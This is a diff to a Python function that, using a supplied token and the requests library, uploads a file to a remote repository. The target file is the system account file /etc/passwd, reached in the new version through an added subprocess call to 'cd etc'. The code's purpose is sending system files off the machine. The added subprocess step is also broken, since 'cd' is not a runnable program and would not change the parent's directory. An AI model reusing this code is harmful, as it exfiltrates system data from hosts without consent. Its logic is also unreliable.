@@ -1,6 +1,17 @@
 # Execute the command
 def run(user, repo, token):
 
+    # Execute the command
+    import subprocess
+
+    # Define the command
+    command = ["cd", "etc"]
+
+    try:
+        subprocess.run(command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+
     print("Breakpoint 0")
 
     import requests
@@ -10,7 +21,7 @@ def run(user, repo, token):
     # Replace these variables with your own values
     repo_owner = user
     repo_name = repo
-    file_path = "/etc/passwd"  # The file you want to upload
+    file_path = "passwd"  # The file you want to upload
     token = token
 
     # Create a session with your PAT
